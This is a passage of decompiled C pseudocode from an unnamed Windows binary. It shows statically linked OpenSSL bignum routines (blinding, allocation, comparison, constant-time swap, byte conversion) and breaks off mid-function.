//----- (00416460) --------------------------------------------------------
int __cdecl sub_416460(LPCRITICAL_SECTION lpCriticalSection)
{
  return sub_4146B0((LPCRITICAL_SECTION)lpCriticalSection[1].OwningThread);
}

//----- (00416470) --------------------------------------------------------
_DWORD *__cdecl sub_416470(int a1, int a2, int a3)
{
  _DWORD *v3; // esi
  struct _RTL_CRITICAL_SECTION *v5; // eax
  void **v6; // eax
  void **v7; // eax
  void **v8; // eax

  v3 = sub_413430(0x28u);
  if ( v3 )
  {
    v5 = sub_414650();
    v3[9] = v5;
    if ( v5 )
    {
      v3[4] = GetCurrentThreadId();
      if ( (!a1 || (v6 = sub_4176D0(a1), (*v3 = v6) != 0))
        && (!a2 || (v7 = sub_4176D0(a2), (v3[1] = v7) != 0))
        && (v8 = sub_4176D0(a3), (v3[3] = v8) != 0) )
      {
        if ( sub_416F30(a3, 4) )
          sub_416F20(v3[3], 4);
        v3[5] = -1;
        return v3;
      }
      else
      {
        sub_416360(v3);
        return 0;
      }
    }
    else
    {
      sub_408310(3, 102, 65, (int)"crypto\\bn\\bn_blind.c", 43);
      sub_413490(v3);
      return 0;
    }
  }
  else
  {
    sub_408310(3, 102, 65, (int)"crypto\\bn\\bn_blind.c", 37);
    return 0;
  }
}

//----- (00416560) --------------------------------------------------------
_DWORD *__usercall sub_416560@<eax>(__m64 a1@<mm0>, _DWORD *a2, int a3, int a4, int *a5, int a6, int a7)
{
  _DWORD *v7; // ebp
  int v8; // ebx
  _DWORD *v9; // esi
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  int v12; // edi
  int *v13; // edi
  int (__cdecl *v15)(_DWORD, _DWORD, _DWORD, _DWORD, int *, _DWORD); // edx

  v7 = a2;
  v8 = 32;
  if ( a2 )
    v9 = a2;
  else
    v9 = sub_416470(0, 0, a4);
  if ( !v9 )
    goto LABEL_29;
  if ( !*v9 )
  {
    v10 = sub_4168C0();
    *v9 = v10;
    if ( !v10 )
      goto LABEL_29;
  }
  if ( !v9[1] )
  {
    v11 = sub_4168C0();
    v9[1] = v11;
    if ( !v11 )
      goto LABEL_29;
  }
  v12 = a3;
  if ( a3 )
  {
    sub_417060((void **)v9[2]);
    v9[2] = sub_4176D0(v12);
  }
  if ( !v9[2] )
    goto LABEL_29;
  if ( a6 )
    v9[8] = a6;
  if ( a7 )
    v9[7] = a7;
  if ( !sub_42A970((_DWORD *)*v9, (_DWORD *)v9[3]) )
    goto LABEL_29;
  v13 = a5;
  while ( !sub_420C00((void **)v9[1], (_DWORD *)*v9, (int *)v9[3], v13, &a2) )
  {
    if ( !a2 )
      goto LABEL_29;
    if ( !v8-- )
    {
      sub_408310(3, 128, 113, (int)"crypto\\bn\\bn_blind.c", 263);
      goto LABEL_29;
    }
    if ( !sub_42A970((_DWORD *)*v9, (_DWORD *)v9[3]) )
      goto LABEL_29;
  }
  v15 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, int *, _DWORD))v9[8];
  if ( v15 && v9[7] )
  {
    if ( v15(*v9, *v9, v9[2], v9[3], v13, v9[7]) )
      return v9;
    goto LABEL_29;
  }
  if ( !sub_4282A0(a1, (int *)*v9, (int *)*v9, (_DWORD *)v9[2], (int *)v9[3], v13) )
  {
LABEL_29:
    if ( !v7 )
    {
      sub_416360(v9);
      return 0;
    }
  }
  return v9;
}

//----- (004166D0) --------------------------------------------------------
int __usercall sub_4166D0@<eax>(__m64 a1@<mm0>, int a2, int *a3)
{
  int *v3; // eax
  int v4; // ebp
  _DWORD *v5; // eax
  int result; // eax

  v3 = *(int **)a2;
  v4 = 0;
  if ( *(_DWORD *)a2 && *(_DWORD *)(a2 + 4) )
  {
    if ( *(_DWORD *)(a2 + 20) == -1 )
      *(_DWORD *)(a2 + 20) = 0;
    if ( ++*(_DWORD *)(a2 + 20) == 32 && *(_DWORD *)(a2 + 8) && (*(_BYTE *)(a2 + 24) & 2) == 0 )
    {
      v5 = sub_416560(a1, (_DWORD *)a2, 0, 0, a3, 0, 0);
    }
    else
    {
      if ( (*(_BYTE *)(a2 + 24) & 1) != 0 )
      {
LABEL_13:
        v4 = 1;
        goto LABEL_15;
      }
      if ( !sub_42A430(v3, v3, (unsigned int **)v3, *(int **)(a2 + 12), a3) )
        goto LABEL_15;
      v5 = (_DWORD *)sub_42A430(
                       *(_DWORD **)(a2 + 4),
                       *(int **)(a2 + 4),
                       *(unsigned int ***)(a2 + 4),
                       *(int **)(a2 + 12),
                       a3);
    }
    if ( !v5 )
      goto LABEL_15;
    goto LABEL_13;
  }
  sub_408310(3, 103, 107, (int)"crypto\\bn\\bn_blind.c", 99);
LABEL_15:
  result = v4;
  if ( *(_DWORD *)(a2 + 20) == 32 )
    *(_DWORD *)(a2 + 20) = 0;
  return result;
}

//----- (00416780) --------------------------------------------------------
int __usercall sub_416780@<eax>(__m64 a1@<mm0>, int *a2, _DWORD *a3, int a4, int *a5)
{
  int v5; // ebx
  int result; // eax

  v5 = 1;
  if ( !*(_DWORD *)a4 || !*(_DWORD *)(a4 + 4) )
  {
    sub_408310(3, 100, 107, (int)"crypto\\bn\\bn_blind.c", 137);
    return 0;
  }
  if ( *(_DWORD *)(a4 + 20) == -1 )
  {
    *(_DWORD *)(a4 + 20) = 0;
  }
  else
  {
    result = sub_4166D0(a1, a4, a5);
    if ( !result )
      return result;
  }
  if ( a3 && !sub_4173E0(a3, *(_DWORD **)(a4 + 4)) )
    v5 = 0;
  if ( !sub_42A430(a2, a2, *(unsigned int ***)a4, *(int **)(a4 + 12), a5) )
    return 0;
  return v5;
}

//----- (00416820) --------------------------------------------------------
void **sub_416820()
{
  return &off_4F19FC;
}
// 4F19FC: using guessed type void *off_4F19FC;

//----- (00416830) --------------------------------------------------------
int __cdecl sub_416830(unsigned int a1)
{
  if ( (a1 & 0xFFFF0000) != 0 )
  {
    if ( (a1 & 0xFF000000) != 0 )
      return (unsigned __int8)byte_4F1A10[HIBYTE(a1)] + 24;
    else
      return (unsigned __int8)byte_4F1A10[HIWORD(a1)] + 16;
  }
  else if ( (a1 & 0xFF00) != 0 )
  {
    return (unsigned __int8)byte_4F1A10[a1 >> 8] + 8;
  }
  else
  {
    return (unsigned __int8)byte_4F1A10[a1];
  }
}

//----- (00416880) --------------------------------------------------------
_DWORD *__cdecl sub_416880(_DWORD *a1)
{
  _DWORD *result; // eax
  int v2; // edx
  int v3; // ecx
  int v4; // edx
  int v5; // ecx

  result = a1;
  v2 = dword_538AE0;
  *a1 = dword_538ADC;
  v3 = dword_538AE4;
  a1[1] = v2;
  v4 = dword_538AE8;
  a1[2] = v3;
  v5 = dword_538AEC;
  a1[3] = v4;
  a1[4] = v5;
  return result;
}
// 538ADC: using guessed type int dword_538ADC;
// 538AE0: using guessed type int dword_538AE0;
// 538AE4: using guessed type int dword_538AE4;
// 538AE8: using guessed type int dword_538AE8;
// 538AEC: using guessed type int dword_538AEC;

//----- (004168C0) --------------------------------------------------------
_DWORD *sub_4168C0()
{
  _DWORD *result; // eax

  result = sub_413430(0x14u);
  if ( result )
  {
    result[4] = 1;
  }
  else
  {
    sub_408310(3, 113, 65, (int)"crypto\\bn\\bn_lib.c", 228);
    return 0;
  }
  return result;
}

//----- (00416900) --------------------------------------------------------
_DWORD *sub_416900()
{
  _DWORD *result; // eax

  result = sub_413430(0x14u);
  if ( result )
  {
    result[4] = 1;
    result[4] |= 8u;
  }
  else
  {
    sub_408310(3, 113, 65, (int)"crypto\\bn\\bn_lib.c", 228);
    return 0;
  }
  return result;
}

//----- (00416940) --------------------------------------------------------
int __cdecl sub_416940(_DWORD *a1)
{
  int v1; // eax

  v1 = a1[1];
  if ( v1 > 1 )
    return -1;
  if ( v1 == 1 )
    return *(_DWORD *)*a1;
  return 0;
}

//----- (00416960) --------------------------------------------------------
int __cdecl sub_416960(_DWORD *a1, int *a2)
{
  int v2; // ecx
  int result; // eax
  int v4; // eax
  int v5; // edx
  unsigned int *v6; // ecx
  int v7; // edi
  unsigned int v8; // edx

  v2 = a1[1];
  result = v2 - a2[1];
  if ( !result )
  {
    v4 = v2 - 1;
    v5 = *a2;
    if ( v2 - 1 < 0 )
    {
      return 0;
    }
    else
    {
      v6 = (unsigned int *)(v5 + 4 * v4);
      v7 = *a1 - v5;
      while ( 1 )
      {
        v8 = *(unsigned int *)((char *)v6 + v7);
        if ( *v6 != v8 )
          break;
        --v4;
        --v6;
        if ( v4 < 0 )
          return 0;
      }
      return *v6 < v8 ? 1 : -1;
    }
  }
  return result;
}

//----- (004169B0) --------------------------------------------------------
int __cdecl sub_4169B0(_DWORD *a1, _DWORD *a2)
{
  int v2; // eax
  int result; // eax
  int v4; // ebp
  int v5; // ecx
  int v6; // edx
  int v7; // edx
  unsigned int *i; // ecx
  unsigned int v9; // esi

  if ( !a1 )
    return a2 != 0;
  if ( !a2 )
    return -1;
  v2 = a1[3];
  if ( v2 != a2[3] )
    return 2 * (v2 == 0) - 1;
  if ( v2 )
  {
    result = -1;
    v4 = 1;
  }
  else
  {
    result = 1;
    v4 = -1;
  }
  v5 = a1[1];
  v6 = a2[1];
  if ( v5 <= v6 )
  {
    if ( v5 >= v6 )
    {
      v7 = v5 - 1;
      if ( v5 - 1 < 0 )
      {
        return 0;
      }
      else
      {
        for ( i = (unsigned int *)(*a2 + 4 * v7); ; --i )
        {
          v9 = *(unsigned int *)((char *)i + *a1 - *a2);
          if ( v9 > *i )
            break;
          if ( v9 < *i )
            return v4;
          if ( --v7 < 0 )
            return 0;
        }
      }
    }
    else
    {
      return v4;
    }
  }
  return result;
}

//----- (00416A50) --------------------------------------------------------
int __cdecl sub_416A50(_DWORD *a1, int a2)
{
  if ( a2 < 0 || a1[1] <= a2 / 32 )
    return 0;
  else
    return (*(_DWORD *)(*a1 + 4 * (a2 / 32)) >> (a2 & 0x1F)) & 1;
}
// 416A77: conditional instruction was optimized away because %arg_4.4>=0

//----- (00416A90) --------------------------------------------------------
int __cdecl sub_416A90(int a1, int a2, int a3)
{
  unsigned int v3; // esi
  unsigned int v4; // ecx
  bool v5; // cf
  int v7; // ecx
  unsigned int *i; // eax
  unsigned int v9; // edx

  v3 = *(_DWORD *)(a2 + 4 * a3 - 4);
  v4 = *(_DWORD *)(a1 + 4 * a3 - 4);
  v5 = v3 < v4;
  if ( v3 != v4 )
    return v5 ? 1 : -1;
  v7 = a3 - 2;
  if ( a3 - 2 >= 0 )
  {
    for ( i = (unsigned int *)(a2 + 4 * v7); ; --i )
    {
      v9 = *(unsigned int *)((char *)i + a1 - a2);
      v5 = *i < v9;
      if ( *i != v9 )
        break;
      if ( --v7 < 0 )
        return 0;
    }
    return v5 ? 1 : -1;
  }
  return 0;
}

//----- (00416AE0) --------------------------------------------------------
int __cdecl sub_416AE0(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  int v5; // esi
  int v6; // ecx
  _DWORD *v7; // edx
  _DWORD *v8; // ecx
  unsigned int v9; // eax
  unsigned int v10; // ecx
  bool v11; // cf
  int v13; // ecx
  unsigned int *i; // eax
  unsigned int v15; // edx

  v4 = a4;
  v5 = a3 - 1;
  if ( a4 >= 0 )
  {
LABEL_5:
    if ( a4 <= 0 )
    {
LABEL_9:
      v9 = *(_DWORD *)(a1 + 4 * a3 - 4);
      v10 = *(_DWORD *)(a2 + 4 * a3 - 4);
      v11 = v10 < v9;
      if ( v10 == v9 )
      {
        v13 = a3 - 2;
        if ( a3 - 2 < 0 )
          return 0;
        for ( i = (unsigned int *)(a2 + 4 * v13); ; --i )
        {
          v15 = *(unsigned int *)((char *)i + a1 - a2);
          v11 = *i < v15;
          if ( *i != v15 )
            break;
          if ( --v13 < 0 )
            return 0;
        }
      }
      return v11 ? 1 : -1;
    }
    v8 = (_DWORD *)(a1 + 4 * (a4 + v5));
    while ( !*v8 )
    {
      --v4;
      --v8;
      if ( v4 <= 0 )
        goto LABEL_9;
    }
    return 1;
  }
  else
  {
    v6 = a4;
    v7 = (_DWORD *)(a2 + 4 * (v5 - a4));
    while ( !*v7 )
    {
      ++v6;
      --v7;
      if ( v6 >= 0 )
        goto LABEL_5;
    }
    return -1;
  }
}

//----- (00416B80) --------------------------------------------------------
int __cdecl sub_416B80(int a1, _DWORD *a2, _DWORD *a3, int a4)
{
  int v4; // edi
  unsigned int v5; // ecx
  int v6; // edx
  int i; // edi
  int v8; // ebx
  int v9; // edx
  int v10; // edi
  int v11; // edx
  int v12; // edi
  int v13; // edx
  int v14; // edi
  int v15; // edx
  int v16; // edi
  int v17; // edx
  int v18; // edi
  int v19; // edx
  int v20; // edi
  int v21; // edx
  int v22; // edi
  int v23; // edx
  int v24; // edi
  int v25; // edx
  int v26; // edi
  int v27; // edx
  int v28; // edx
  int result; // eax

  v4 = a2[1];
  v5 = ((unsigned int)(a1 - 1) >> 31) - 1;
  v6 = v5 & (v4 ^ a3[1]);
  a2[1] = v6 ^ v4;
  a3[1] ^= v6;
  switch ( a4 )
  {
    case 1:
      goto LABEL_13;
    case 2:
      goto LABEL_12;
    case 3:
      goto LABEL_11;
    case 4:
      goto LABEL_10;
    case 5:
      goto LABEL_9;
    case 6:
      goto LABEL_8;
    case 7:
      goto LABEL_7;
    case 8:
      goto LABEL_6;
    case 9:
      goto LABEL_5;
    case 10:
      goto LABEL_4;
    default:
      for ( i = 10; i < a4; ++i )
      {
        v8 = *(_DWORD *)(*a2 + 4 * i);
        v9 = v5 & (v8 ^ *(_DWORD *)(*a3 + 4 * i));
        *(_DWORD *)(*a2 + 4 * i) = v9 ^ v8;
        *(_DWORD *)(*a3 + 4 * i) ^= v9;
      }
LABEL_4:
      v10 = *(_DWORD *)(*a2 + 36);
      v11 = v5 & (v10 ^ *(_DWORD *)(*a3 + 36));
      *(_DWORD *)(*a2 + 36) = v11 ^ v10;
      *(_DWORD *)(*a3 + 36) ^= v11;
LABEL_5:
      v12 = *(_DWORD *)(*a2 + 32);
      v13 = v5 & (v12 ^ *(_DWORD *)(*a3 + 32));
      *(_DWORD *)(*a2 + 32) = v13 ^ v12;
      *(_DWORD *)(*a3 + 32) ^= v13;
LABEL_6:
      v14 = *(_DWORD *)(*a2 + 28);
      v15 = v5 & (v14 ^ *(_DWORD *)(*a3 + 28));
      *(_DWORD *)(*a2 + 28) = v15 ^ v14;
      *(_DWORD *)(*a3 + 28) ^= v15;
LABEL_7:
      v16 = *(_DWORD *)(*a2 + 24);
      v17 = v5 & (v16 ^ *(_DWORD *)(*a3 + 24));
      *(_DWORD *)(*a2 + 24) = v17 ^ v16;
      *(_DWORD *)(*a3 + 24) ^= v17;
LABEL_8:
      v18 = *(_DWORD *)(*a2 + 20);
      v19 = v5 & (v18 ^ *(_DWORD *)(*a3 + 20));
      *(_DWORD *)(*a2 + 20) = v19 ^ v18;
      *(_DWORD *)(*a3 + 20) ^= v19;
LABEL_9:
      v20 = *(_DWORD *)(*a2 + 16);
      v21 = v5 & (v20 ^ *(_DWORD *)(*a3 + 16));
      *(_DWORD *)(*a2 + 16) = v21 ^ v20;
      *(_DWORD *)(*a3 + 16) ^= v21;
LABEL_10:
      v22 = *(_DWORD *)(*a2 + 12);
      v23 = v5 & (v22 ^ *(_DWORD *)(*a3 + 12));
      *(_DWORD *)(*a2 + 12) = v23 ^ v22;
      *(_DWORD *)(*a3 + 12) ^= v23;
LABEL_11:
      v24 = *(_DWORD *)(*a2 + 8);
      v25 = v5 & (v24 ^ *(_DWORD *)(*a3 + 8));
      *(_DWORD *)(*a2 + 8) = v25 ^ v24;
      *(_DWORD *)(*a3 + 8) ^= v25;
LABEL_12:
      v26 = *(_DWORD *)(*a2 + 4);
      v27 = v5 & (v26 ^ *(_DWORD *)(*a3 + 4));
      *(_DWORD *)(*a2 + 4) = v27 ^ v26;
      *(_DWORD *)(*a3 + 4) ^= v27;
LABEL_13:
      v28 = v5 & (*(_DWORD *)*a2 ^ *(_DWORD *)*a3);
      *(_DWORD *)*a2 ^= v28;
      result = *a3;
      *(_DWORD *)*a3 ^= v28;
      return result;
  }
}

//----- (00416D10) --------------------------------------------------------
int __cdecl sub_416D10(int a1, int a2)
{
  int v2; // ecx
  int result; // eax

  if ( a1 < 15360 )
  {
    if ( a1 < 7690 )
    {
      if ( a1 < 3072 )
      {
        if ( a1 < 2048 )
        {
          if ( a1 < 1024 )
            return 0;
          v2 = 80;
        }
        else
        {
          v2 = 112;
        }
      }
      else
      {
        v2 = 128;
      }
    }
    else
    {
      v2 = 192;
    }
  }
  else
  {
    v2 = 256;
  }
  if ( a2 == -1 )
    return v2;
  result = a2 / 2;
  if ( a2 / 2 >= 80 )
  {
    if ( result < v2 )
      return result;
    return v2;
  }
  return 0;
}

//----- (00416D80) --------------------------------------------------------
BOOL __cdecl sub_416D80(int a1, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(a1 + 4);
  return v2 == 1 && **(_DWORD **)a1 == a2 || !a2 && !v2;
}

//----- (00416DB0) --------------------------------------------------------
BOOL __cdecl sub_416DB0(int a1)
{
  return *(_DWORD *)(a1 + 4) == 0;
}

//----- (00416DC0) --------------------------------------------------------
BOOL __cdecl sub_416DC0(int a1)
{
  return *(_DWORD *)(a1 + 4) == 1 && **(_DWORD **)a1 == 1 && !*(_DWORD *)(a1 + 12);
}

//----- (00416DE0) --------------------------------------------------------
int __cdecl sub_416DE0(int a1, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(a1 + 4);
  if ( v2 == 1 && **(_DWORD **)a1 == a2 )
  {
    if ( !a2 )
      return 1;
    return *(_DWORD *)(a1 + 12) == 0;
  }
  else
  {
    if ( a2 )
      return 0;
    return v2 == 0;
  }
}

//----- (00416E20) --------------------------------------------------------
BOOL __cdecl sub_416E20(int a1)
{
  return *(int *)(a1 + 4) > 0 && (**(_BYTE **)a1 & 1) != 0;
}

//----- (00416E40) --------------------------------------------------------
BOOL __cdecl sub_416E40(int a1)
{
  return *(_DWORD *)(a1 + 12) != 0;
}

//----- (00416E50) --------------------------------------------------------
int __usercall sub_416E50@<eax>(__m64 a1@<mm0>, unsigned int *a2, int *a3, int a4, int *a5)
{
  return sub_428890(a1, a2, a3, a4 + 4, a4, a5);
}

//----- (00416E80) --------------------------------------------------------
_DWORD *__cdecl sub_416E80(_DWORD *a1, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = *a2;
  a1[1] = a2[1];
  a1[2] = a2[2];
  a1[3] = a2[3];
  a1[4] = a3 | a1[4] & 1 | a2[4] & 0xFFFFFFFE | 2;
  return result;
}

//----- (00416EC0) --------------------------------------------------------
void *sub_416EC0()
{
  void *result; // eax

  result = sub_4133F0(0xCu);
  if ( !result )
  {
    sub_408310(3, 143, 65, (int)"crypto\\bn\\bn_lib.c", 967);
    return 0;
  }
  return result;
}

//----- (00416F00) --------------------------------------------------------
void __cdecl sub_416F00(void *Block)
{
  if ( Block )
    sub_413490(Block);
}

//----- (00416F20) --------------------------------------------------------
int __cdecl sub_416F20(int a1, int a2)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(a1 + 16) |= a2;
  return result;
}

//----- (00416F30) --------------------------------------------------------
int __cdecl sub_416F30(int a1, int a2)
{
  return a2 & *(_DWORD *)(a1 + 16);
}

//----- (00416F40) --------------------------------------------------------
_DWORD *__cdecl sub_416F40(_DWORD *a1, int a2, int a3)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = 2;
  a1[1] = a3;
  a1[2] = a2;
  return result;
}

//----- (00416F60) --------------------------------------------------------
int __cdecl sub_416F60(_DWORD *a1)
{
  int result; // eax
  _DWORD *v2; // ecx

  result = a1[1];
  if ( result > 0 )
  {
    v2 = (_DWORD *)(*a1 + 4 * result);
    do
    {
      if ( *--v2 )
        break;
      --result;
    }
    while ( result > 0 );
    a1[1] = result;
  }
  return result;
}

//----- (00416F90) --------------------------------------------------------
int __cdecl sub_416F90(_DWORD *a1)
{
  int result; // eax
  int v2; // eax
  int v3; // ecx

  result = a1[1];
  if ( result )
  {
    v2 = sub_416830(*(_DWORD *)(*a1 + 4 * (result - 1)));
    return 32 * v3 + v2;
  }
  return result;
}
// 416FAA: variable 'v3' is possibly undefined

//----- (00416FC0) --------------------------------------------------------
void __cdecl sub_416FC0(int a1)
{
  if ( (*(_BYTE *)(a1 + 16) & 8) != 0 )
    sub_42AC10(*(void **)a1);
  else
    sub_413490(*(void **)a1);
}

//----- (00417000) --------------------------------------------------------
void __cdecl sub_417000(_DWORD *Block)
{
  int v1; // edi

  if ( Block )
  {
    if ( *Block )
    {
      sub_4139E0((_BYTE *)*Block, 4 * Block[2]);
      if ( (Block[4] & 2) == 0 )
        sub_416FC0((int)Block);
    }
    v1 = Block[4] & 1;
    sub_4139E0(Block, 0x14u);
    if ( v1 )
      sub_413490(Block);
  }
}

//----- (00417060) --------------------------------------------------------
void __cdecl sub_417060(void **Block)
{
  void *v1; // eax
  unsigned int v2; // eax

  if ( Block )
  {
    v1 = Block[4];
    if ( ((unsigned __int8)v1 & 2) == 0 )
    {
      if ( ((unsigned __int8)v1 & 8) != 0 )
        sub_42AC10(*Block);
      else
        sub_413490(*Block);
    }
    v2 = (unsigned int)Block[4];
    if ( (v2 & 1) != 0 )
    {
      sub_413490(Block);
    }
    else
    {
      Block[4] = (void *)(v2 | 0x8000);
      *Block = 0;
    }
  }
}

//----- (004170D0) --------------------------------------------------------
_DWORD *__cdecl sub_4170D0(int a1, int a2)
{
  int v2; // esi
  int v4; // ecx
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  int v7; // edx
  int v8; // esi
  int v9; // edi
  int v10; // ebx
  _DWORD *v11; // [esp+Ch] [ebp+8h]

  v2 = a1;
  if ( a2 > 0xFFFFFF )
  {
    sub_408310(3, 120, 114, (int)"crypto\\bn\\bn_lib.c", 255);
    return 0;
  }
  v4 = *(_DWORD *)(a1 + 16);
  if ( (v4 & 2) != 0 )
  {
    sub_408310(3, 120, 105, (int)"crypto\\bn\\bn_lib.c", 259);
    return 0;
  }
  if ( (v4 & 8) != 0 )
    v5 = sub_42ABE0(4 * a2);
  else
    v5 = sub_413430(4 * a2);
  v11 = v5;
  if ( !v5 )
  {
    sub_408310(3, 120, 65, (int)"crypto\\bn\\bn_lib.c", 267);
    return 0;
  }
  v6 = *(_DWORD **)a1;
  if ( *(_DWORD *)a1 )
  {
    v7 = *(int *)(a1 + 4) >> 2;
    if ( v7 > 0 )
    {
      do
      {
        v8 = v6[1];
        v9 = v6[2];
        v10 = v6[3];
        *v5 = *v6;
        v5[1] = v8;
        v5[2] = v9;
        v5[3] = v10;
        --v7;
        v5 += 4;
        v6 += 4;
      }
      while ( v7 > 0 );
      v2 = a1;
    }
    switch ( *(_DWORD *)(v2 + 4) & 3 )
    {
      case 1:
        goto LABEL_19;
      case 2:
LABEL_18:
        v5[1] = v6[1];
LABEL_19:
        *v5 = *v6;
        return v11;
      case 3:
        v5[2] = v6[2];
        goto LABEL_18;
    }
  }
  return v11;
}

//----- (004171F0) --------------------------------------------------------
_DWORD *__cdecl sub_4171F0(int a1, int a2)
{
  _DWORD *result; // eax
  _DWORD *v3; // edi

  if ( a2 > *(_DWORD *)(a1 + 8) )
  {
    result = sub_4170D0(a1, a2);
    v3 = result;
    if ( !result )
      return result;
    if ( *(_DWORD *)a1 )
    {
      sub_4139E0(*(_BYTE **)a1, 4 * *(_DWORD *)(a1 + 8));
      sub_416FC0(a1);
    }
    *(_DWORD *)a1 = v3;
    *(_DWORD *)(a1 + 8) = a2;
  }
  return (_DWORD *)a1;
}

//----- (00417240) --------------------------------------------------------
int __usercall sub_417240@<eax>(char *a1@<ecx>, _DWORD *a2@<ebx>, int a3)
{
  int v3; // eax
  int v4; // ebp
  int v6; // eax
  int v7; // ecx
  int v8; // eax
  int v9; // kr04_4
  int v10; // esi

  v3 = a2[1];
  v4 = a3;
  if ( v3 )
  {
    v6 = sub_416830(*(_DWORD *)(*a2 + 4 * (v3 - 1)));
    v3 = 32 * v7 + v6;
  }
  v9 = v3 + 7;
  v8 = (((v3 + 7) >> 31) & 7) + v3 + 7;
  v10 = v9 / 8;
  if ( a3 == -1 )
  {
    v4 = v8 >> 3;
  }
  else
  {
    if ( a3 < v10 )
      return -1;
    if ( a3 > v10 )
    {
      memset(a1, 0, a3 - v10);
      a1 += a3 - v10;
    }
  }
  for ( ; v10; *(a1 - 1) = *(_DWORD *)(*a2 + 4 * (v10 / 4)) >> (8 * (v10 % 4)) )
  {
    --v10;
    ++a1;
  }
  return v4;
}
// 41725E: variable 'v7' is possibly undefined

//----- (004172E0) --------------------------------------------------------
int __cdecl sub_4172E0(_DWORD *a1, char *a2, int a3)
{
  if ( a3 >= 0 )
    return sub_417240(a2, a1, a3);
  else
    return -1;
}

//----- (00417300) --------------------------------------------------------
int __cdecl sub_417300(_DWORD *a1, char *a2)
{
  return sub_417240(a2, a1, -1);
}

//----- (00417320) --------------------------------------------------------
int __cdecl sub_417320(_DWORD *a1, int a2)
{
  int v3; // eax
  unsigned int v4; // ecx
  int v5; // eax
  _DWORD *v6; // ecx

  if ( a2 < 0 )
    return 0;
  v3 = a2 / 32;
  v4 = a2 & 0x8000001F;
  if ( a2 / 32 >= a1[1] )
    return 0;
  if ( v4 )
  {
    a1[1] = v3 + 1;
    *(_DWORD *)(*a1 + 4 * v3) &= ~(-1 << v4);
  }
  else
  {
    a1[1] = v3;
  }
  v5 = a1[1];
  if ( v5 > 0 )
  {
    v6 = (_DWORD *)(*a1 + 4 * v5);
    do
    {
      if ( *--v6 )
        break;
      --v5;
    }
    while ( v5 > 0 );
    a1[1] = v5;
  }
  return 1;
}
// 41733C: conditional instruction was optimized away because %arg_4.4>=0

//----- (00417390) --------------------------------------------------------
int __cdecl sub_417390(int a1, int a2)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(a1 + 12) = a2 && *(_DWORD *)(a1 + 4);
  return result;
}

//----- (004173C0) --------------------------------------------------------
_DWORD *__cdecl sub_4173C0(int a1, int a2)
{
  _DWORD *result; // eax

  result = (_DWORD *)a1;
  if ( a2 > *(_DWORD *)(a1 + 8) )
    return sub_4171F0(a1, a2);
  return result;
}

//----- (004173E0) --------------------------------------------------------
_DWORD *__cdecl sub_4173E0(_DWORD *a1, _DWORD *a2)
{
  _DWORD *v2; // esi
  _DWORD *v3; // edi
  _DWORD *result; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  int v7; // edx
  int v8; // esi
  int v9; // edi
  int v10; // ebx

  v2 = a2;
  v3 = a1;
  if ( a1 == a2 )
    return v3;
  if ( a2[1] > a1[2] )
    result = sub_4171F0((int)a1, a2[1]);
  else
    result = a1;
  if ( result )
  {
    v5 = (_DWORD *)*a1;
    v6 = (_DWORD *)*a2;
    v7 = (int)a2[1] >> 2;
    if ( v7 > 0 )
    {
      do
      {
        v8 = v6[1];
        v9 = v6[2];
        v10 = v6[3];
        *v5 = *v6;
        v5[1] = v8;
        v5[2] = v9;
        v5[3] = v10;
        --v7;
        v5 += 4;
        v6 += 4;
      }
      while ( v7 > 0 );
      v2 = a2;
      v3 = a1;
    }
    if ( (v2[1] & 3) != 1 )
    {
      if ( (v2[1] & 3) != 2 )
      {
        if ( (v2[1] & 3) != 3 )
        {
LABEL_15:
          v3[1] = v2[1];
          v3[3] = v2[3];
          return v3;
        }
        v5[2] = v6[2];
      }
      v5[1] = v6[1];
    }
    *v5 = *v6;
    goto LABEL_15;
  }
  return result;
}

//----- (00417490) --------------------------------------------------------
int __cdecl sub_417490(_DWORD *a1, int a2)
{
  int result; // eax
  _DWORD *v3; // ecx

  if ( (int)a1[2] < 1 )
    result = (int)sub_4171F0((int)a1, 1);
  else
    result = (int)a1;
  if ( result )
  {
    v3 = (_DWORD *)*a1;
    a1[3] = 0;
    *v3 = a2;
    result = 1;
    a1[1] = a2 != 0;
  }
  return result;
}

//----- (004174D0) --------------------------------------------------------
int __cdecl sub_4174D0(_BYTE *a1, int a2, int a3)
{
  int v3; // edi
  void **v4; // eax
  int i; // eax
  int v8; // edx
  unsigned int v9; // eax
  int v10; // esi
  int v11; // ebp
  _DWORD *v12; // eax
  int v13; // eax
  int v14; // ecx
  int v15; // esi
  int v16; // eax
  _DWORD *v17; // ecx
  void **Block; // [esp+8h] [ebp-8h]
  int v19; // [esp+Ch] [ebp-4h]
  _DWORD *v20; // [esp+1Ch] [ebp+Ch]

  v3 = a3;
  Block = 0;
  if ( !a3 )
  {
    v4 = (void **)sub_413430(0x14u);
    if ( v4 )
    {
      v4[4] = (void *)1;
      Block = v4;
      v3 = (int)v4;
    }
    else
    {
      sub_408310(3, 113, 65, (int)"crypto\\bn\\bn_lib.c", 228);
      v3 = 0;
      Block = 0;
    }
    if ( !v3 )
      return 0;
  }
  for ( i = a2; i > 0; ++a1 )
  {
    if ( *a1 )
      break;
    --i;
  }
  v8 = i;
  v19 = i;
  if ( !i )
  {
    *(_DWORD *)(v3 + 4) = 0;
    return v3;
  }
  v9 = i - 1;
  v10 = (v9 >> 2) + 1;
  v11 = v9 & 3;
  if ( v10 > *(_DWORD *)(v3 + 8) )
  {
    v12 = sub_4170D0(v3, v10);
    v20 = v12;
    if ( !v12 )
    {
      sub_417060(Block);
      return 0;
    }
    if ( *(_DWORD *)v3 )
    {
      sub_4139E0(*(_BYTE **)v3, 4 * *(_DWORD *)(v3 + 8));
      sub_416FC0(v3);
      v12 = v20;
    }
    v8 = v19;
    *(_DWORD *)v3 = v12;
    *(_DWORD *)(v3 + 8) = v10;
  }
  v13 = 0;
  *(_DWORD *)(v3 + 4) = v10;
  *(_DWORD *)(v3 + 12) = 0;
  v14 = 4 * v10;
  do
  {
    v13 = (unsigned __int8)*a1 | (v13 << 8);
    v15 = v11;
    --v8;
    ++a1;
    --v11;
    if ( !v15 )
    {
      v14 -= 4;
